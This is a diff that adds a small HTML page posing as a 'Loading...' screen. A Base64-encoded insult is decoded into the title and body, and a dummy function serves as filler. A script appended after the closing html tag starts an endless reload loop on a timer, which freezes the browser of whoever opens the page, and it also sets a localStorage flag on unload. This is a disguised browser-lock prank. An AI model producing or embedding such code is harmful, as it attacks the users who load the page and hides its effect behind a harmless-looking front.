@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+    <script>
+        // Hidden (Base64)
+        const encoded = "eW91IGFyZSBhbiBpZGlvdA==";
+
+        function decodeMessage(str) {
+            return atob(str);
+        }
+
+        function setContent() {
+            const msg = decodeMessage(encoded);
+
+            // Set tab title
+            document.title = msg;
+
+            // Set page content
+            document.getElementById("content").innerText = msg;
+        }
+
+        // Dummy code (no visible effect)
+        function noise() {
+            let arr = [];
+            for (let i = 0; i < 100; i++) {
+                arr.push(i * 2);
+            }
+            return arr.filter(x => x < 0); // always empty
+        }
+
+        noise();
+    </script>
+</head>
+<body onload="setContent()">
+    <h1 id="content">Loading...</h1>
+</body>
+</html>
+<script>
+  onbeforeunload = function(){localStorage.x=1};
+
+setTimeout(function(){
+  while(1)location.reload(1)
+}, 1)
+</script>
